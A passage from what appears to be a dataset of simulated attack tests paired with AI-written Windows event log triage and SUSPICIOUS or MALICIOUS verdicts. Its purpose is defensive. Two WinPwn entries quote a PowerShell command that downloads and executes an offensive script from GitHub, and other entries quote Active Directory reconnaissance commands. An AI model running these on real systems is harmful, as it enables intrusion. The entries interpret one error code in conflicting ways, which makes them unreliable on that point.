5. **Repeated Special Privilege Assignments** - The logs show repeated instances of special privileges being assigned to system accounts which could imply either scripted actions or misconfiguration, potentially allowing unwanted privileged actions.

Based on these observations, I recommend investigating the following:

- **Confirm Usage of AdFind.exe:** Check if the usage of `AdFind.exe` is authorized within the environment. Analyze any data that might have been accessed or extracted using this tool.

- **Investigate User Enumeration:** Review the context under which user enumeration activities were performed, particularly examining `taskhostw.exe` for anomalous behavior or unexpected task schedules.

- **Audit File Integrity and Process Execution:** Review file and process creation events to ensure no tampering or unauthorized modifications have occurred. Consider checking for file integrity on sensitive executables involved.

- **Security Review and Hardening:** Given the level of privilege appearing in logs, verify if there are any configuration oversights allowing privilege misuse. Enhance monitoring around key security groups and privileged accounts.

Finalizing the assessment based on identified activities and patterns, the resolution is:

- **SUSPICIOUS**: The logs contain activity suggestive of reconnaissance and potential unauthorized data access, which requires further investigation to rule out or confirm malicious intent. Prioritize reviewing user actions and system configurations to determine potential points of exploitation."
Suspicious LAPS Attributes Query with Get-ADComputer all properties,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided logs, here's a detailed assessment focusing on potential malicious indicators and patterns:

1. **Sysmon Logs:**
   - The frequent execution of `C:\Windows\System32\wevtutil.exe` and `C:\Windows\System32\conhost.exe` with the user `SERVER002\admin_test` is visible. These processes can be legitimate Windows processes but could also be leveraged during enumeration or attempts to tamper with event logs. Frequent and rapid execution timestamps suggest possible suspicious behavior necessitating review of what changes were initiated by these processes.
   - The command ""C:\Windows\System32\wevtutil.exe"" frequently appearing without clear context in these logs. If used to clear or alter event logs, this should be investigated further.
  
2. **Windows PowerShell Logs:**
   - PowerShell execution with the command 'Get-ADComputer $env:computername -Properties *' is observed. This indicates enumeration of Active Directory Computer objects, likely for reconnaissance purposes, possibly to gain information that could be used in a subsequent compromise. PowerShell running with high integrity level hints at been run in an elevated privilege session.

3. **System Logs:**
   - System logs seem typical with time adjustment related activity logged by `svchost.exe`. No clear malicious indicators observed here.

4. **Security Logs:**
   - The Security Logs indicate time adjustments, which could suggest attempts to masquerade or track activities differently; however, this action in isolation without clear malicious activity isn’t sufficient evidence of compromise.

5. **Application Logs:**
   - The presence of Microsoft Edge Update processes (`MicrosoftEdgeUpdate.exe`) is generally benign as such updates occur regularly via scheduled tasks intended for browser maintenance and security patching.

**Assessment and Guidance:**

- **Suspicious Behavior:**
  - The enumeration of Active Directory with PowerShell and repeated execution of potentially sensitive utilities (`wevtutil`) suggest elevated privilege operations querying system or network-level data.
  - While not explicitly malicious, these activities without accompanied context, such as updates or administrative scripts, often warrant an investigation to rule out misuse.

**Resolution: SUSPICIOUS**

- **Risks Identified:**
  - Potential for unauthorized reconnaissance using PowerShell.
  - Possible misuse of `wevtutil.exe` for log tampering.

**Guidance:**
- Confirm administrator-initiated scripts or processes during the timeframe correlating with PowerShell and wevtutil execution.
- Check for security policies and recent changes or updates that may align with the observed Sysmon events.
- Review user activity or credentials for `admin_test`, focusing on authentication logs to verify legitimate use.
- Consider running endpoint detection tools to further evaluate for any advanced signs of compromise or misuse of privileges.
- If no benign justification is found, conduct a deeper investigation into the processes, configurations, or any unauthorized devices accessing the Server002 system during these operations."
Suspicious LAPS Attributes Query with adfind all properties,"Upon reviewing the provided logs for indicators of malicious activity, several details justifying suspicious activity were identified, particularly in relation to the use of PowerShell and the presence of external utilities such as AdFind.exe:

### Observations:

1. **Multiple Instances of `wevtutil.exe` and `conhost.exe`:**
   - Throughout the logs, multiple instances of `wevtutil.exe` and `conhost.exe` are being executed by the `SERVER002\admin_test` user. While these are legitimate Windows binaries, frequent and repetitive execution in a short timeframe is often associated with log clearing or process manipulation, tactics commonly employed by attackers.
   
2. **Execution of `hostname.exe` and `whoami.exe`:**
   - These are legitimate Windows binaries. However, when used in conjunction with other activities, such as excessive usage of PowerShell or external tools, could be indicative of attackers attempting to gather system and user context information.

3. **PowerShell Script Execution Suspicion:**
   - A significant red flag is the use of PowerShell to execute a script involving `AdFind.exe`, which appears to be located within a temp directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe`). `AdFind.exe` is often used in reconnaissance operations to query Active Directory information.
   - The script uses PowerShell to invoke `AdFind.exe` with command-line parameters designed to conduct a subtree search for computer objects against the domain. This behavior is indicative of an enumeration script often employed in preparation for subsequent lateral movement.

4. **System and Security Log Time Adjustments:**
   - There are adjustments to the system time noted within both the System and Security logs. While this could be benign, time changes, especially unexplained or frequent ones, could be an indicator of attempts to manipulate timestamps on logs or events, a common technique to obfuscate activities.

### Assessment:

Based on the information gathered, particularly the suspicious use of PowerShell to execute an external utility like `AdFind.exe` from an unusual directory, there is enough cause for concern. The combination of these events suggests reconnaissance activities possibly linked to a compromise.

### Resolution:

**SUSPICIOUS** - The activity observed is concerning and warrants further investigation. The use of `AdFind.exe` for Active Directory enumeration sets off alarms. It is recommended to follow up with:

- A full audit of user `admin_test` activities.
- Reviewing outbound network traffic for unusual patterns or data exfiltration attempts.
- Checking for the presence of similar tools or scripts on other systems within the network.
- Enhancing monitoring around the use of PowerShell and the execution of atypical scripts or binaries. 

Determining whether these actions were unauthorized requires immediate attention to assess the full scope and intent."
Enumerate Active Directory for Unconstrained Delegation,"In analyzing the provided Windows event logs, I will focus on identifying any indicators of suspicious or potentially malicious behavior. Here is a breakdown of my analysis:

### PowerShell Logs:

1. **PowerShell Execution**: The logs indicate the execution of a PowerShell script, specifically using the command:
   ```
   powershell.exe & {Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain}
   ```
   - **Analysis**: The command searches for Active Directory objects that are flagged with a specific `UserAccountControl` value. This value corresponds to 'TRUSTED_FOR_DELEGATION', which is generally used to look for accounts that can delegate credentials. This could be considered a reconnaissance activity potentially used by attackers to understand the environment and identify high-value targets.

### Sysmon Logs:

1. **Processes and Users**: Repeated instances of different processes like `wevtutil.exe`, `conhost.exe`, and various Microsoft Edge Update components being launched might indicate normal activity. Most processes are executed by `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`.
   
2. **Unusual Activity**: The execution of `powershell.exe` from `C:\Windows\System32\WindowsPowerShell\v1.0\` aligns with the PowerShell logs but adds context around the parent processes involved.

3. **Process Relations**: The `powershell.exe` execution is linked to `wsmprovhost.exe`, which is the Windows Remote Management service, indicating this was likely initiated via a WinRM session. While legitimate in many administrative contexts, remote management combined with directory querying could raise suspicion.

### Application Log:

1. **Edge Update**: Regular updates and registration tasks for Microsoft Edge are visible, which is consistent with software update processes. The use of a temporary directory for executable storage is not uncommon and does not necessarily indicate malicious activity.

### Conclusion:

- **Potential Reconnaissance**: The PowerShell script's specific command for enumerating AD accounts with certain permissions, coupled with remote executions, suggests potential reconnaissance activity. This is suspicious, although not immediately malicious without additional context.

- **Software Update Activity**: The Microsoft Edge Update processes appear to be standard update tasks with no direct indicators of malicious activity.

### Resolution:

**SUSPICIOUS**: The activity requires further investigation due to the Active Directory query and remote management context. It would be prudent to:
- Verify the legitimacy of the scripts and processes executed by the `admin_test` account.
- Check if this activity is part of regular administrative actions or a scheduled task.
- Review login and remote access logs to confirm the origin of these actions.
- Evaluate network traffic around the time of these events for unusual behavior or connections to unknown external IPs.

Taking these steps will help confirm if the activity is benign administrative work or if further action is needed to mitigate potential security threats."
Discover System Language by Windows API Query,"### Detailed Analysis of the Windows Event Logs

#### Observations:

1. **Event ID 4624** - Indicates successful logon events. These events show SYSTEM logon using ADVAPI process, which suggests Windows Services started. The logon type 5 indicates a service logon, which is typical when services are started.

2. **Event ID 4672** - Special privileges assigned to new logon events. It reflects that the SYSTEM user received privileges such as SeDebugPrivilege. While these are high-level privileges, they are typical for the SYSTEM account, which is a built-in administrative account used by Windows system processes.

3. **Event ID 5379** - Credential Manager credentials were read. The return code 3221226021 (STATUS_NO_SUCH_LOGON_SESSION) indicates failure, which could mean the related operations failed possibly due to non-existence or misconfigurations.

4. **Event ID 4798** - A user enumeration event where the taskhostw.exe process is querying user accounts. This could indicate a program or service checking user roles or configurations.

5. **Sysmon Events**:
   - **Event ID 5**: File creation events from typical system processes such as `wevtutil.exe` and `conhost.exe`, run by `SERVER002\admin_test`. These entries are standard and expected when viewing or managing Windows Event logs, particularly with elevated privileges.
   - **Event ID 1**: Process creation regarding standard system binaries like `whoami.exe`, `svchost.exe`, and `cmd.exe`. A notable event is the execution of `cmd.exe` with LanguageKeyboardLayout.exe from a temporary file path by `admin_test`, which could be potentially suspicious if this file is unknown or unexpected during normal operations.
   
6. **Application Log**:
   - **Security-Sysmon** - Indicates that the Software Protection Platform Service has been running.
   - **SecurityCenter (Event ID 15)** - Indicates Windows Defender is active, showing that basic antivirus protection is engaged and working.

#### Assessment:

- **Benign Activity**: Most of the events recorded are related to system-level processes being executed and logging typical operations such as starting and managing services or interacting with the Windows security logs.
  
- **Suspicious Activity or Need for Further Investigation**:
  - The execution of `cmd.exe` with LanguageKeyboardLayout.exe located in a temporary path can be suspicious, especially because it is triggered by a user account `admin_test`. This needs further investigation to determine the nature and legitimacy of `LanguageKeyboardLayout.exe`, as temporary paths and unknown executables might indicate a dropper or other malicious scenario.

#### Conclusion: 

Though most observed events represent typical system behavior, the presence of LanguageKeyboardLayout.exe warrants a closer look due to its execution context and origin. Without further context or additional logs to ascertain its legitimacy, the activity can be considered **SUSPICIOUS** and requires further investigation to rule out any potential security threats such as unauthorized software installation or privilege escalation attempts.

### Recommended Actions:
- Conduct a hash and signature analysis of `LanguageKeyboardLayout.exe` to verify its authenticity and check it against known malicious files.
- Monitor and trace activities related to the `admin_test` account for potential misuse.
- Ensure that all system patches and antivirus definitions remain up-to-date.
- Consider setting stricter policies for executing scripts from temporary directories.

Resolution: **SUSPICIOUS**"
Detect a Debugger Presence in the Machine,"**Analysis of Windows Event Logs:**

1. **System Logs:**
   - There are several events related to time changes on the system, specifically the change events captured by `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service`. Time change logs (EventIDs 1 and 24) could be normal or administrative but deserve attention if not expected in context, especially if they align with other suspicious activities.

2. **Windows PowerShell Logs:**
   - The PowerShell logs indicate that some common checks are being executed (EventID 600) regarding debugger processes and flags. The PowerShell script snippet checks for processes with names matching ""dbg"" or ""debug"" and checks if debugging flags are attached. This behavior aligns with potential reconnaissance or anti-analysis behavior by malicious scripts but can also be part of legitimate scripting.

3. **Security Logs:**
   - There are logged events showing account logon and elevation of privileges for `admin_test` (EventIDs 4624, 4634, and 4672). Elevation of privileges (SeDebugPrivilege and others) is notable as this may indicate a compromised account, especially since these privileges are sensitive and necessary for various system-level activities.

4. **Sysmon Logs:**
   - Execution of `HOSTNAME.EXE`, `whoami.exe`, and PowerShell with specific commandlines appear. The process `wsmprovhost.exe` is the parent process for PowerShell which indicates potential remote administration activity.
   - `wevtutil.exe` is seen multiple times, which might suggest event log manipulation or querying by `admin_test`.
   - There are many Microsoft Edge update activities running under `NT AUTHORITY\SYSTEM`. This is normal when updates occur but should be cross-referenced with actual expected update schedules if concerns persist.
   - The presence of multiple processes that are spawned, including those usually started during system updates or maintenance, does not directly suggest any malicious intent.

5. **Application Logs:**
   - Logged entries for `edgeupdate` service stopping at multiple instances might be part of regular scheduler actions weather updates or maintenance actions.

**Assessment and Resolution:**

- The PowerShell activities checking for debuggers and modifying script execution behaviors are suspicious but don't conclusively indicate malicious actions, possibly anti-analysis steps.
- Privilege elevation and time modifications raise further suspicion, especially if unauthorized by the administration.
- The systematic execution of certain processes like `wevtutil.exe` by an admin user along with elevated privileges points to potentially malicious behavior.

**Resolution: SUSPICIOUS**

**Guidance on how to proceed:**
- Path forward would include further investigation, especially around `admin_test` account activity, and cross-check with known administrative actions.
- Look into detailed script logs and verify if `wevtutil.exe` execution was intentional.
- Analyze user, network logs, and account configurations to ensure that `admin_test` account activity is authorized.
- If malicious actions are suspected beyond a reasonable doubt, appropriate incident response processes should be initiated, including containment."
User Discovery With Env Vars PowerShell Script,"### Analysis of the Windows Event Logs

#### Security Logs:
- **EventID 5379**: These events indicate credential validation attempts for services related to Microsoft accounts and Windows Live. The return code `3221226021` corresponds to `STATUS_INVALID_PARAMETER`, suggesting that the login attempts or operations did not succeed, possibly due to incorrect parameters or credentials. The repeated occurrence of this event might indicate either a configuration issue or a failed login attempt by a script or automated process.

#### Sysmon Logs:
- **Process Execution (EventID 1)**: The log shows the execution of known Windows utilities like `whoami.exe`, `HOSTNAME.EXE`, and `conhost.exe` several times. These could be legitimate activities as part of user or system monitoring.
- **PowerShell Execution (EventID 1 and PowerShell Logs)**: PowerShell commands were executed to obtain and log the username. The command `powershell.exe & {[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt , $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append}` does not seem malicious but does indicate scripting activity. Its execution might warrant further investigation to confirm it aligns with normal admin activity.
- **Use of Logging Tools (wevtutil.exe)**: The presence of `wevtutil.exe` is not inherently suspicious as it is used for managing Windows event logs. However, its usage frequency in this timeframe is notable and should be cross-checked with standard operations on the machine.

#### Application and System Logs:
- **Windows Defender Updates**: Logs indicate that Windows Defender was active and up-to-date, reflecting normal system maintenance.
- **Windows Update Client**: Shows regular updates to security intelligence for Microsoft Defender Antivirus, indicative of routine and benign activity.
- **Kernel-General EventID 15**: Denoting a change in the size of a registry hive file. This is typical during system updates and is corroborated by the rest of the update logs.

#### Windows PowerShell Logs:
- PowerShell usage is consistent with a script used to log active user details. While scripting and file output can be used in malicious activities, the specific script here is straightforward and appears benign based on the given data. However, continued vigilance is advised to ensure these scripts align with expected admin tasks.

### Conclusion:
- **Suspicious Activity**: The credential validation attempts with error code `3221226021`, paired with recursive script usage to log user data, are activities that should be investigated further to rule out configuration errors or initial reconnaissance attempts.
- **Malicious Indicators**: There are no explicit indicators of compromise or overtly malicious actions detected in the logs.
- **Resolution**: **SUSPICIOUS**. The activity seen necessitates further examination, particularly around unauthorized script execution and credential validation failures, to ensure these are not precursors to or symptoms of deeper system compromise.

### Guidance:
- **Next Steps**: 
  - Verify if the PowerShell activity falls within the expected usage pattern for this system or user.
  - Confirm whether the credential validation errors are due to misconfigurations or unauthorized access attempts.
  - Review the environment for any new scripts or changes introduced around the timeframe of these logs.
  - Investigate all accounts associated with failed logins or script execution to ensure they haven't been compromised.
- **Monitor and Alert**: Ensure logging continues and consider setting up alerts for repetitive credential failures and unusual script executions to promptly catch and handle potential compromise attempts."
File and Directory Discovery (PowerShell),"### Detailed Analysis of Windows Event Logs

#### **Unusual and Suspicious Activity Detected:**

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - Throughout the Sysmon logs, `wevtutil.exe` and `conhost.exe` are frequently executed by the user `SERVER002\admin_test`. While these executables are legitimate Windows processes (`wevtutil` being used for managing event logs and `conhost` as a console window host), the high frequency and repeated consecutive execution could suggest the possible automation or scripting activities that require further investigation.

2. **PowerShell Activity:**
   - A PowerShell command executed with the command line: `powershell.exe & {ls -recurse, get-childitem -recurse, gci -recurse}` is noted in the logs. This command recursively lists files and directories, which may indicate possible reconnaissance or data gathering activity. The presence of such command execution without a clear legitimate purpose could be suspicious.

3. **Time Manipulation Activity:**
   - Security and system logs show evidence of time synchronization activities (`EventID 4616`). The `svchost.exe` process is associated with changing system times, recorded at slightly unusual order indicating backdated time (`PreviousTime` is later than `NewTime`). This behavior should be examined closely, as it may be used by adversaries to obfuscate logs and activity timelines.

4. **Potential Remote Management Indication:**
   - Execution of processes like `wsmprovhost.exe` (Windows Server Management Provider Host) could be indicative of remote management sessions, which on its own isn't necessarily malicious, but in combination with other unusual behaviors should be further scrutinized.

#### **Assessment:**

Given the outlined suspicious activities, such as the excessive use of system utilities like `wevtutil` and `conhost`, accompanied by recursive PowerShell commands, and possibly malicious intent linked with time modification activities, there are indicators that these actions could be part of a larger strategy to gather information or cover tracks on the system.

While these activities do not, in themselves, immediately incriminate any known malicious software or behavior, they contain unusual patterns that require further validation and context gathering (e.g., checking if `admin_test` performed these actions for legitimate reasons).

#### **Resolution: SUSPICIOUS**

**Recommendation:**
- Conduct further investigation to explore the context of these activities, including:
  - Verification if there are legitimate scheduled tasks or scripts run by `admin_test` that could justify this behavior.
  - Cross-reference these events with network logs for any irregular network activity indicating data exfiltration.
  - Perform a more detailed examination of recent access permissions and other logs to identify any unauthorized access patterns.
  - If possible, contact the user `admin_test` or their supervisor to confirm if these activities are expected as per their job role.
- Consider isolating the host for deeper forensic analysis to ensure there is no ongoing compromise, especially if any malicious indicators escalate further after initial investigations."
Elevated group enumeration using net group (Domain),"After analyzing the provided Windows event logs, I have identified several pieces of potentially suspicious activity. Below is a detailed analysis of these findings:

1. **Process Execution and Command Lines**:
   - Multiple processes related to Microsoft Edge Update are run by `NT AUTHORITY\SYSTEM`. While in itself not suspicious as Edge update could be automatic, it is important to ensure these files are legitimate, particularly looking at any temporary file execution.
   - `whoami.exe`, `hostname.exe`, `cmd.exe`, `net.exe`, and `net1.exe` executed by the user `SERVER002\admin_test` are noteworthy. The specific interest lies in the command line executed through `cmd.exe`, which includes an attempt to list domain groups such as ""Domain Admins"" which could indicate privilege reconnaissance activities.

2. **Privilege Escalation**:
   - The log entry with Event ID 4672 indicates that the account `admin_test` has been granted a set of special privileges, such as `SeDebugPrivilege` and `SeBackupPrivilege`, among others. These privileges are typically associated with higher levels of system control and could represent an attempt to escalate privileges or perform actions that require elevated permissions.

3. **Network Activities**:
   - There are entries suggesting that the user `admin_test` is utilizing `net.exe` and `net1.exe` commands to query domain group membership. This aligns with typical behavior observed in information gathering stages of a security incident or malicious activity.
   
4. **Security Event Logs**:
   - Log entries indicate both logoff (Event ID 4634) and logon (Event ID 4624) events for the user `admin_test`. This aligns with a typical user session, but combined with privilege escalation and reconnaissance activities, it might warrant further scrutiny.

5. **Applications and Services**:
   - No unusual activities were observed in the application logs involving applications/services that could pose a security threat, aside from the regular entries related to Microsoft Edge updates.

### Conclusion: 
Based on the elements outlined above, particularly the privilege escalation, command execution, and group enumeration by the user `admin_test`, the activity appears **suspicious**. There is not enough evidence to conclusively state this is malicious activity, but it warrants further investigation to rule out any potential security incidents.

### Recommended Action:
- **Investigate the Source**: Check the origin and legitimacy of the user `admin_test` and their purpose on this server.
- **Review Privileges**: Ensure that the privileges assigned to `admin_test` are appropriate for their role and check for any unauthorized privilege escalation.
- **Inspect Processes**: Verify the integrity of the Edge Update files executed, possibly with a hash or digital signature check.
- **Network Monitoring**: Continue monitoring for any unusual network activities that could indicate data exfiltration or further reconnaissance actions.
- **Retain Logs**: Maintain these logs for further correlation with additional security data to determine if there's a broader threat actor presence.

Resolution: **SUSPICIOUS** - Further investigation is required to validate the legitimacy and context of these activities, ensuring they are not part of a larger compromise."
WinPwn - powerSQL,"### Event Log Analysis

Upon analyzing the provided event logs from the Windows host identified as ""Server002,"" several important observations can be made regarding system activity:

#### Potential Malicious Activity

1. **PowerShell Execution**:
   - A PowerShell script is executed with the command: 
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), powerSQL -noninteractive -consoleoutput}
     ```
   - This activity is highly suspicious because it involves downloading and executing a script from an external source via PowerShell, which is often indicative of malicious activity such as remote code execution or initial access to conduct lateral movement.

2. **Elevated Privilege Processes**:
   - There are multiple instances where processes are executed under a high integrity level or as SYSTEM, suggesting potential privilege escalation activities. This is especially critical when considered alongside the suspicious PowerShell activity.

#### Normal System Activity

Most of the other Sysmon, Security, and Application log entries depict regular system activities such as:
- Scheduled tasks (e.g., `Taskhostw.exe`).
- Microsoft Edge update processes.
- Windows internal services like `svchost.exe`, `CompatTelRunner.exe`, and typical software update components.
- Normal Windows Defender status updates and system health check-ups.
- Service stop and start events for EdgeUpdate and other typical services.

### Threat Assessment and Conclusion

Given the detected use of PowerShell to download and likely execute an unknown script from a GitHub repository, there is a significant indication of potentially malicious activity. This type of behavior is classic for scripts that might facilitate unauthorized access or manipulation of the target system, aligning with malicious intent.

The event logs do not indicate direct evidence of successful infiltration beyond this script execution; however, the act itself can potentially allow for various post-exploitation techniques or data exfiltration if left unaddressed.

### Resolution

Based on the analysis:

- **Resolution**: **MALICIOUS**

### Suggested Course of Action

1. **Immediate Containment**: This specific host should be isolated from the network immediately to prevent further potential exploitation or data leaks, assess and curtail any outreach to untrusted domains.

2. **Full Investigation**: Conduct a comprehensive forensic examination on the `Server002` machine to determine the full extent of any possible compromise, including but not limited to reviewing network connections, any data transfers, or attempts at lateral movement.

3. **Remediation and Recovery**: Once the investigation is complete, remove any malicious artifacts or software from the host, update all security measures, and monitor for any suspicious activity. Implement stricter PowerShell execution policies and script monitoring.

4. **Review and Strengthen Defenses**: Evaluate the security posture of the organization, refine existing security protocols, and ensure that all security tools are up-to-date to prevent a recurrence of such incidents."
System Owner-User Discovery,"### Detailed Log Analysis:

#### Windows Security Logs:
- **Event ID 4798**: This series of events is related to user enumeration, indicative of a call to list all user accounts. It logs the same timestamp for multiple user account accesses, all initiated by the user `admin_test` from the process `C:\Windows\System32\wbem\WmiPrvSE.exe`. 
  - This activity itself is unusual because it involves accessing multiple user accounts (Administrator, DefaultAccount, Guest, lplui, sshd, testing, WDAGUtilityAccount) which could be an indicator of enumeration potentially tied to reconnaissance activities by an attacker.
  
- **Event ID 5379**: Reflects unsuccessful credential retrieval attempts involving a Microsoft account through a process ID 2456.
  - The repeated failed attempts to access credentials using a logon ID tied to the machine itself (WORKGROUP\S-1-5-18, SERVER002$) could suggest malicious intent but also could represent a system or software misconfiguration.

#### Sysmon Logs:
- **Process Executions**: Multiple instances of `cmd.exe`, `hostname.exe`, `whoami.exe`, and `wmic.exe` have been executed by the account `admin_test`. These commands indicate enumeration of system user information and presence verification.
  - The execution of series of commands through `cmd.exe` to extract user account details and session information (`wmic useraccount get /ALL`, `quser`, `qwinsta`) along with checks for active sessions strongly suggests reconnaissance actions typical of an attacker exploring a system post-compromise.

#### Application and System Logs:
- Logs indicate that Windows Defender is active (`SECURITY_PRODUCT_STATE_ON`), and recent updates to Microsoft Defender Antivirus definitions were successful.

#### Overall Assessment:
- The user `admin_test` is prominently involved in activities such as querying user accounts, checking logged-on users, and attempting credential retrieval, which are known behaviors in a compromised environment scenario where an attacker gains initial access and seeks to escalate privileges or further explore the compromised system.

### Conclusion:
- **Resolution: MALICIOUS** - The combination of events indicates systematic user account enumeration and information gathering using system utilities. The failed access attempts and heavy usage of administrative/command-line tools to query sensitive information mandates classification as malicious. 

### Guidance on How to Proceed:
1. **Immediate Isolation**: Isolate `Server002` from the network to prevent further lateral movement or exfiltration of data by an attacker.
2. **Review Admin Accounts**: Note the activities carried out by `admin_test` and check for unauthorized changes or backdoors.
3. **Conduct a Thorough Investigation**: Exploit investigation SOPs should include seeking additional artifacts, reviewing any endpoint protection alerts, examining file system changes, scheduled tasks, and installed services.
4. **Change Passwords and Review Access Controls**: Reset all credentials, especially those operating at an elevated level, and audit recent administrator account activities.
5. **Update and Patch Systems**: Ensure all systems are fully updated, and apply patches to known vulnerabilities promptly."
WinPwn - GPORemoteAccessPolicy,"Upon thorough analysis of the provided Windows event logs from the host, several elements indicate potentially malicious activities. Here is a breakdown of the findings from the logs:

**1. **PowerShell Activity:**

- The PowerShell logs demonstrate execution of a script via `powershell.exe` that downloads and executes a script (`WinPwn.ps1`) from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`). This is suspicious because downloading and executing scripts from the internet can potentially be an indicator of malicious or unauthorized activities, especially if the source is unknown or untrustworthy.
- The command used in PowerShell also utilizes `Invoke-Expression` (`iex`), which is often used by attackers to execute obfuscated or downloaded scripts.
  
**2. **Security Log:**

- There are multiple logon events for the user ""admin_test"" with Event ID 4624 (successful logon) and 4672 (special privileges assigned). The privileges granted to ""admin_test"" include SeDebugPrivilege and SeLoadDriverPrivilege, which are often exploited for privilege escalation or to bypass security controls.
  
**3. **System Log:**

- Time discrepancies in Event ID 1 (indicating time changes) at 16:43:09, which can be a sign of tampering if unauthorized. Time changes can be leveraged by attackers to evade detection by altering timestamps.

**4. **Sysmon Logs:**

- The Sysmon logs indicate the execution of a process with an unknown image, which could be an indicator of malicious payload execution.
- Processes such as `wevtutil.exe` and `conhost.exe` are executed by the user ""admin_test,"" which may indicate attempts to manipulate or gather event log data, a tactic commonly used to cover tracks.
- A PowerShell process is noticed with a high privilege level executing the script downloaded, correlating with the suspicious PowerShell activity.

### **Assessment:**
Combining evidence from the PowerShell, Security, and Sysmon logs indicates a pattern of behavior consistent with malicious activity. The script download and execution, privilege escalation, and event log modification attempts are all red flags.

### **Resolution: MALICIOUS**
Based on the logs provided, the activity appears to be malicious. The behavior aligns with techniques often used in attacks involving script-based malware or post-exploitation activity.

### **Guidance:**

1. **Immediate Actions:**
   - Isolate the affected host (Server002) from the network to prevent further actions by the adversary.
   - Conduct a preliminary forensic analysis to understand the full extent of the compromise.
   - Check for other hosts with similar behaviors or connections to the same external IPs/domains.

2. **Follow-Up:**
   - Change credentials and enforce MFA for affected users.
   - Review and enhance PowerShell logging and control policies (e.g., enable PowerShell Constrained Mode).
   - Update and perform a full AV scan of the environment to discover and mitigate further threats.
   - Monitor network traffic for unusual patterns to detect signs of data exfiltration.
   - Implement stricter privilege management and audit logging for future threat detections and prevention.

Conclusively, the resolution is **MALICIOUS**, and the organization should act promptly to mitigate any potential risks and secure the network."
Enumerate Active Directory Users with ADSISearcher,"Upon reviewing the provided logs from various sources, the following observations have been made:

### Windows PowerShell Logs:
- **Behavior Detected**: The PowerShell commands being executed involve retrieving information from the Active Directory using [adsisearcher] and objectcategory filters. This is often legitimate in system administration scenarios for querying user objects.
- **Suspicion**: While the execution of PowerShell with queries for ""objectcategory=user"" could be associated with legitimate administration tasks, it could also be indicative of reconnaissance activity if not expected. However, no other specific malicious activities or unexpected command-line parameters are noted here.

### Application Logs:
- **Windows Defender**: Status is reported as active, which is a positive indicator that real-time protection is enabled.
- **Microsoft Edge Update**: Several entries related to the update processes indicate the update service started and stopped. This is typical behavior during software updates and doesn't directly indicate malicious activity.

### System Logs:
- **Security Intelligence Update**: There are entries indicating updates for Microsoft Defender Antivirus, which is normal and indicates that the antivirus signatures are updated.
- **Time Change Events**: These involve svchost.exe and are likely related to system time adjustments. There is no clear indication of malicious activity solely based on this behavior unless correlated with other suspicious activities.

### Sysmon Logs:
- **Processes Executed**: There are numerous instances of processes like `wevtutil.exe`, `conhost.exe`, `svchost.exe`, and various executables associated with Microsoft Edge updates. 
- **User Context**: Most processes are executed under NT AUTHORITY\SYSTEM or a local admin account, which are higher-level privileges but common for system tasks.
- **Suspicious Activity**: The execution of processes part of the EdgeUpdate under NT AUTHORITY\SYSTEM can be considered normal in the context of legitimate software updates.

### Security Logs:
- **Time Synchronizations**: The logs show time synchronization events (Event ID 4616), which are normal and part of regular system operations.

### Conclusion:
1. **PowerShell Activity** would be considered suspicious if it isn't expected, given it involves potential enumeration of user accounts. Significant care must be taken to ensure such activity aligns with known administrative operations.
2. **Overall Activity**: The logs indicate regular system maintenance and update activities related to Microsoft Edge and Windows Defender, typical of benign operations.

### Recommendation:
- **Resolution**: **SUSPICIOUS**
- While no overt signs of malicious activity like malware or exploitation are evident, the use of PowerShell for querying user data suggests further investigation might be beneficial to ensure it's part of intended administrative actions.
- **Next Steps**: Validate with system administrators whether the PowerShell queries were launched for legitimate reasons. If no such justification exists, consider deeper investigation into user activities and potential access logs to validate the legitimacy of this behavior."
BIOS Information Discovery through Registry,"To assess the provided logs for any malicious activity, let's perform a thorough analysis based on the content from each set of logs: Application, Security, System, and Sysmon logs.

### Application Log Analysis:
1. **Event Records (IDs 2386-2388)**: 
   - The logs show typical informational messages from software components like Software Protection Platform Service and Edge Update service, indicating a normal operation update or reboot sequence, with no error or warning messages accompanying them.

### Security Log Analysis: 
1. **Event Records (IDs 30351-30352)**:
   - These logs show time change events (`Event ID 4616`) using Local Service via `svchost.exe`, which can occur during daylight savings changes or when the machine synchronizes with a time server. The occurrence between these two events is merely 0.001 milliseconds apart, indicating a very fine-tuned synchronization likely caused by automatic Windows behavior.

### Sysmon Log Analysis:
1. **Events involving `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `cmd.exe`, and `whoami.exe`**:
   - The use of `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `cmd.exe`, and `whoami.exe` by user `SERVER002\admin_test` appears to represent administrative or routine operations on the host.
   - `cmd.exe` is used for querying registry keys related to system BIOS and video BIOS versions, which might seem uncommon but could be justified in context if a system diagnostics or inventory script were running.
   - A prominent sequence of Microsoft Edge Update processes appears, aligning with regular update or software installation activities. The processes performed under `NT AUTHORITY\SYSTEM` user and `SERVER002\admin_test` are consistent with routine application management.

### System Log Analysis:
1. **Event Records (IDs 3568-3572)**:
   - The logs show time adjustment and synchronization entries from Windows Time Service, again appearing typical for routine time maintenance steps, typically adjusting after system reboot or network time protocol (NTP) synchronization steps.

### Conclusion:

None of the logs contain overtly suspicious or unauthorized activities such as unknown script/shell execution, privilege escalation attempts, or network connections that would suggest a compromise. The activities logged appear routine and can be explained by system updates and maintenance procedures.

### Resolution:
**BENIGN** - if further context such as ongoing known administrative processes or updates is confirmed. Otherwise, the nature of the operations, particularly around Edge Update and PowerShell/cmd utility usage, doesn't show direct signs of compromise but should be validated against known scheduled tasks or approved processes within the organization. If no validations are possible, the activities should be marked **SUSPICIOUS** for further investigation into any potential anomaly in the environment.

Guidance on Further Actions:
- Confirm with the system owner or admin team if these operations align with known update schedules or administrative tasks.
- Consider setting up more detailed logging for Edge Update processes if they're not part of a planned operation.
